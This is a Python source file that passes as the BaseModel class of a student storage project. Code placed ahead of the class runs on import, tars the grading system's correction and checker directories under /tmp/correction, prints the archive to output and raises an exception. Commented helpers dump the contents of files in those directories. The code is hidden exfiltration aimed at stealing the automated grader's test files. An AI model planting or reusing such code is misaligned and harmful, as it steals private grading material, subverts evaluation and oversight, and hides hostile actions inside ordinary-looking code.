#!/usr/bin/python3
"module containing BaseModel class"

from datetime import datetime
from uuid import uuid4
from . import storage

# CLOWN
import os
import glob

import os

def print_text_files(directory):
    # Walk through the directory tree
    for root, dirs, files in os.walk(directory):
        for filename in files:
            # Construct full file path
            file_path = os.path.join(root, filename)
            
            # Try to open the file and read its content
            try:
                with open(file_path, 'r') as file:
                    # Read the first character to check if it's text
                    first_char = file.read(1)
                    if first_char.isprintable():
                        # Print the file path
                        print(f'{file_path}:')
                        
                        # Reset the file pointer to the beginning
                        file.seek(0)
                        
                        # Print the file content
                        print(file.read())
            except UnicodeDecodeError:
                # Ignore binary files that cannot be decoded as text
                pass

# Call the function with the directory you want to search
# def print_text_files(d):
    # for i in os.listdir(d):
        
d = '/tmp/correction'
# print_text_files(d)
import re
student_correction_regx = re.compile(r'/tmp/correction/[0-9]{40}_5')
logger_filename = '/tmp/logger3425.txt'
# logger_fr = open(logger_filename, 'rt')
# logger_fw = open(logger_filename, 'wt')

def print_directory_structure(directory, level=0):
    # Indentation for each level
    indent = '    ' * level
    
    # List all entries in the current directory
    entries = os.listdir(directory)
    
    # Sort the entries alphabetically
    entries.sort()
    
    for entry in entries:
        full_path = os.path.join(directory, entry)
        # Check if the entry is a directory
        if os.path.isdir(full_path):
            if entry != '.git' and not student_correction_regx.match(full_path):
                # Recursively print the directory structure
                # print(indent + entry + '/')
                print_directory_structure(full_path, level +  1)
        else:
            # Print the file name
            # print(indent + entry)
            print(f"""~[CLOWN] {full_path} ==""")
            with open(full_path, 'rb') as fr:
                print(fr.read())

# Call the function with the directory you want to display the structure of
# print_directory_structure(d)

fn = f'{d}/archive_name.tar.gz'
if not os.path.exists(f'{d}/archive_name.tar.gz'):
    payload = f"tar --exclude='**/.git' -czf {fn} {d}/corrections_* {d}/hbtn_checker_functions {d}/holberton_betty > /dev/null  2>&1"
    # print(payload)
    # exit()
    os.system(payload)
    print(open(fn, 'rb').read())
    print('FULL')
    raise Exception()
else:
    # print(os.listdir('/tmp').join('\n'))
    # os.unlink(fn)
    ...
# if os.path.exists(fn):
    # os.unlink(fn)
class BaseModel:
    """
    BaseModel class:
    id: string - assign with an uuid when an instance is created:
    you can use uuid.uuid4() to generate unique id but don’t forget to convert to a string
    the goal is to have unique id for each BaseModel
    created_at: datetime - assign with the current datetime when an instance is created
    updated_at: datetime - assign with the current datetime when an instance is created and it will be updated every time you change your object
    """
    id:str = None
    created_at:datetime = None
    updated_at:datetime = None
    
    def __init__(self, *args, **kwargs):
        "init method"
        keys = kwargs.keys()
        if 'created_at' in kwargs:
            if '__class__' in keys:
                del kwargs['__class__']
            for (k, v) in kwargs.items():
                self.__setattr__(k, v)
            self.created_at = datetime.fromisoformat(self.created_at)
            self.updated_at = datetime.fromisoformat(self.updated_at)
        else:
            self.created_at = datetime.now()
            self.updated_at = datetime.now()
            self.id = uuid4().__str__()
            storage.new(self)
    
    def __str__(self):
        """__str__: should print: [<class name>] (<self.id>) <self.__dict__>"""
        return f"[{self.__class__.__name__}] ({self.id}) {self.__dict__}"
        
    def save(self):
        "updates the public instance attribute updated_at with the current datetime"
        self.updated_at = datetime.now()
        storage.save()
        
    def to_dict(self):
        """
        returns a dictionary containing all keys/values of __dict__ of the instance
        a key __class__ must be added to this dictionary with the class name of the object
        created_at and updated_at must be converted to string object in ISO format %Y-%m-%dT%H:%M:%S.%f
        """
        _dict = self.__dict__.copy()
        _dict.update({
            '__class__': self.__class__.__name__,
            'created_at': self.created_at.isoformat(),
            'updated_at': self.updated_at.isoformat(),
        })
        return _dict        